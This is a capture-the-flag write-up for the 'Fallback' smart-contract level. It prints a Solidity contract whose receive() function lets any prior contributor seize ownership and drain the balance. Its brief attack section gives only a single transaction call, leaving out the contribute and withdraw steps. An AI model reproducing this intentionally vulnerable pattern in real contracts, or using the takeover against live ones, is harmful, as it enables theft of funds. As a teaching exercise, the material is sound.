## Fallback
#### Challenge 

Difficulty 1/10

Look carefully at the contract's code below.

You will beat this level if

1.  you claim ownership of the contract
2.  you reduce its balance to 0

  Things that might help

-   How to send ether when interacting with an ABI
-   How to send ether outside of the ABI
-   Converting to and from wei/ether units (see `help()` command)
-   Fallback methods
### Sources

```js
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }
  
  // fallback fn. :)
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

##### Level author:

Alejandro Santander

---
#### Solution
---
- player
`0x6DC51f9C50735658Cc6a003e07B0b92dF9c98473`
- contract.address
`0x7aDcd9d1B849F90B96Df0b3cB125FF1438114166`
- await ethernaut.owner()
`0x09902A56d04a9446601a0d451E07459dC5aF0820`
- await contract.owner()
`0x9CB391dbcD447E645D6Cb55dE6ca23164130D008`
##### Attack
- `contract.sendTransaction({value: 1})` 
	- this will triggers the fallback fn.